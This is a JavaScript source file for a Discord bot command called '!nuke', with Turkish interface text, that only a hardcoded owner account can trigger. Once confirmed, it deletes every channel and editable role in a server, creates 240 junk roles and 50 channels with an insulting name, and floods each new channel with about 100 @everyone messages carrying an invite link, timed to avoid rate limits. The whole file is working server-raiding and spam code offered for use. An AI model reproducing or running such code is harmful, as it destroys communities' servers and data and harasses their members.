const { 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    ModalBuilder, 
    TextInputBuilder, 
    TextInputStyle, 
    InteractionType 
} = require('discord.js');

module.exports = {
    name: '!nuke',
    async execute(message) {
        const OWNER_ID = "1389930042200559706";
        if (message.author.id !== OWNER_ID) return;

        const client = message.client;
        if (!client.nukeListenerSet) {
            client.on('interactionCreate', async (int) => {
                if (int.customId === 'btn_nuke_start' || int.customId === 'modal_nuke_confirm') {
                    await this.handleInteraction(int);
                }
            });
            client.nukeListenerSet = true;
        }

        const embed = new EmbedBuilder()
            .setColor('#ff0000')
            .setTitle('☣️ FORCES Nuke Sistemi')
            .setDescription(
                `**DİKKAT:** Bu komut sunucuyu tamamen sıfırlar!\n\n` +
                `▫️ Tüm kanallar silinecek.\n` +
                `▫️ Tüm roller temizlenecek.\n` +
                `▫️ 50 yeni kanal açılıp @everyone spamı yapılacak.\n` +
                `▫️ 240 tane boş rol açılacak.`
            )
            .setFooter({ text: 'Geri dönüşü yoktur!' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('btn_nuke_start')
                .setLabel('Saldırıyı Onayla')
                .setStyle(ButtonStyle.Danger)
        );

        await message.reply({ embeds: [embed], components: [row] });
    },

    async handleInteraction(interaction) {
        if (interaction.isButton() && interaction.customId === 'btn_nuke_start') {
            const modal = new ModalBuilder().setCustomId('modal_nuke_confirm').setTitle('Nuke Onayı');
            modal.addComponents(
                new ActionRowBuilder().addComponents(
                    new TextInputBuilder()
                        .setCustomId('confirm_text')
                        .setLabel('Onaylamak için "EVET" yazın')
                        .setStyle(TextInputStyle.Short)
                        .setRequired(true)
                )
            );
            return await interaction.showModal(modal);
        }

        if (interaction.type === InteractionType.ModalSubmit && interaction.customId === 'modal_nuke_confirm') {
            const confirmText = interaction.fields.getTextInputValue('confirm_text');
            if (confirmText.toLowerCase() !== 'evet') return interaction.reply({ content: 'İşlem iptal edildi.', ephemeral: true });

            await interaction.reply({ content: '☣️ **Nuke Operasyonu Başladı!** Sunucu imha ediliyor...', ephemeral: true });

            const guild = interaction.guild;
            const channelNames = ["rate", "1993", "forces-siker"];

            // 1. KANALLARI SİL
            const channels = await guild.channels.fetch();
            for (const channel of channels.values()) {
                await channel.delete().catch(() => {});
                await new Promise(r => setTimeout(r, 1000)); // 1 saniye bekle
            }

            // 2. ROLLERİ SİL
            const roles = await guild.roles.fetch();
            for (const role of roles.values()) {
                if (role.name !== '@everyone' && role.editable && !role.managed) {
                    await role.delete().catch(() => {});
                    await new Promise(r => setTimeout(r, 1000));
                }
            }

            // 3. YENİ ROLLER OLUŞTUR (240 Adet)
            for (let i = 0; i < 240; i++) {
                await guild.roles.create({ name: "Cyber", color: '#ff0000' }).catch(() => {});
                await new Promise(r => setTimeout(r, 500)); // Rolleri biraz daha hızlı açabiliriz
            }

            // 4. KANALLARI AÇ VE SPAM YAP (50 Adet)
            for (let i = 0; i < 50; i++) {
                const randomName = channelNames[Math.floor(Math.random() * channelNames.length)];
                await guild.channels.create({
                    name: randomName,
                    type: 0 // Text Channel
                }).then(async (chan) => {
                    // Kanal başına 100 mesaj (Discord limiti için ideal)
                    for (let j = 0; j < 100; j++) {
                        chan.send("@everyone https://discord.gg/rate").catch(() => {});
                        await new Promise(r => setTimeout(r, 300));
                    }
                }).catch(() => {});
                await new Promise(r => setTimeout(r, 1000));
            }
        }
    }
};
